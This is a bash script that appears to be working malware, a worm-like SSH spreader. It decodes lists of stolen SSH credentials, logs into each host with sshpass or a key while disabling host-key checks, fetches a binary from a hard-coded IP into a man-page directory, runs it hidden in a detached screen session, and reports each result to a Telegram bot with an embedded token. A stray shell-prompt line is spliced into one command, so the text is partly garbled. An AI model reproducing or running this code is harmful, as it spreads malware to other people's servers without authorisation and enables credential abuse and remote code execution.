#!/bin/bash
# http://185.141.25.168/api/supermicro_cr.gz
allThreads=($1)
crypt_pass=$(curl -s "http://185.141.25.168/get_pass.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF3s="
MegPw0rD3root@John:~# curl -s "http://185.141.25.168/get_pass.php?apirequests=udbFVt_xv0tsAmLDpz5Z3Ct4-p0gedUPdQO-UWsfd6PHz9Ky-wM3mIC9El4kwl_SlX3lpraVaCLnp-K0WsgKmpYTV9XpYncHzbtvn591qfaAwpGyOvsS4v1Yj7OvpRw_iU4554RuSsvHpI9jaj4XUgTK5yzbWKEddANjAAbxF2s="
) # AES PASS
command_download="apt install wget curl -y;yum install wget curl -y;cd /usr/share/man/man8/;wget http://185.141.25.168/api/supermicro_cr.gz;chmod +x supermicro_cr.gz;nohup ./supermicro_cr.gz '$crypt_pass' & exit"

install_tools ()
{
	yum install wget curl sshpass pssh openssl -y &>/dev/null
}

send_message ()
{
	TOKEN='1322235264:AAE7QI-f1GtAF_huVz8E5IBdb5JbWIIiGKI'
	MSG_URL='https://api.telegram.org/bot'$TOKEN'/sendMessage?chat_id='
	MSG=$1
	ID_MSG='1297663267'

	for id in $ID_MSG
	do
		curl -s --insecure --data-urlencode "text=$MSG" "$MSG_URL$id&" &>/dev/null &
	done
}

check_ssh_connect() #example (check_ssh_connect root|127.0.0.1|22|true/false|password/null); true=check with passw; false=check with key; return code:0-good connect 254-ping error 255-ssh connect error
{
	parse_arg=$1

	user_host=$(echo "${parse_arg}" | awk -F "|" '{print $1}')
	ip_host=$(echo "${parse_arg}" | awk -F "|" '{print $2}')
	port_host=$(echo "${parse_arg}" | awk -F "|" '{print $3}')
	passwd_state=$(echo "${parse_arg}" | awk -F "|" '{print $4}')
	password=$(echo "${parse_arg}" | awk -F "|" '{print $5}')

	if (ping $ip_host -c 1 -w 3  >/dev/null); then
		echo -e "[+] Ping \033[32m${ip_host}\033[0m good"
		if ($passwd_state); then
			echo -e "SSH Connection with Password: $password to \033[33m$user_host@$ip_host:$port_host\033[0m"
			if (sshpass -p $password ssh -o stricthostkeychecking=no -o userknownhostsfile=/dev/null -o passwordauthentication=yes "${user_host}"@"${ip_host}" -p "${port_host}" : 2>/dev/null); then
				return 0 
			else
				return 255
			fi
		else
			echo -e "Check SSH Connection with Key: rsa_key \033[33m$user_host@$ip_host:$port_host\033[0m"
			if (ssh -i rsa_key -o stricthostkeychecking=no -o userknownhostsfile=/dev/null -o passwordauthentication=no "${user_host}"@"${ip_host}" -p "${port_host}" : 2>/dev/null);then
				return 0
			else
				return 255
			fi
		fi
	else
		echo -e "[-] Ping \033[31m${ip_host}\033[0m bad"
		return 254
	fi
}

ssh_exec_command()
{
	parse_arg=$1

	user_host=$(echo "${parse_arg}" | awk -F "|" '{print $1}')
	ip_host=$(echo "${parse_arg}" | awk -F "|" '{print $2}')
	port_host=$(echo "${parse_arg}" | awk -F "|" '{print $3}')
	passwd_state=$(echo "${parse_arg}" | awk -F "|" '{print $4}')
	password=$(echo "${parse_arg}" | awk -F "|" '{print $5}')

	if ($passwd_state); then
		sshpass -p $password ssh -o stricthostkeychecking=no -o userknownhostsfile=/dev/null -o passwordauthentication=yes "${user_host}"@"${ip_host}" -p "${port_host}" 'su root -c "apt install wget curl -y;yum install wget curl -y;cd /usr/share/man/man8/;wget http://185.141.25.168/api/supermicro_cr.gz;chmod +x supermicro_cr.gz;screen -dmS FUCK nohup ./supermicro_cr.gz '$crypt_pass' &" <<< HITMANcodename47'
	else
		ssh -i rsa_key -o stricthostkeychecking=no -o userknownhostsfile=/dev/null -o passwordauthentication=no "${user_host}"@"${ip_host}" -p "${port_host}" 'apt install wget screen curl -y;yum install screen wget curl -y;cd /usr/share/man/man8/;wget http://185.141.25.168/api/supermicro_cr.gz;chmod +x supermicro_cr.gz;screen -dmS FUCK nohup ./supermicro_cr.gz '$crypt_pass' &'
	fi
}

start_thread()
{
	for encode_ssh_credential in ${allThreads[@]}; do
		#decode_ssh_credential=$(openssl enc -base64 -d <<< $encode_ssh_credential)
		decode_ssh_credential=$(openssl enc -base64 -d <<< $encode_ssh_credential)
		echo "Run $decode_ssh_credential"
		check_ssh_connect $decode_ssh_credential
		case $? in
			'0') ssh_exec_command $decode_ssh_credential
				 send_message "Run upload script ($decode_ssh_credential)";;
			'254') echo "Ping error"
				   send_message "Host unavailable ($decode_ssh_credential)";;
			'255') echo "SSH connection bad"
				   send_message "Bad credential ($decode_ssh_credential)";;
			*) echo "Unknown error"
		esac
	done
}

start_thread $allThreads
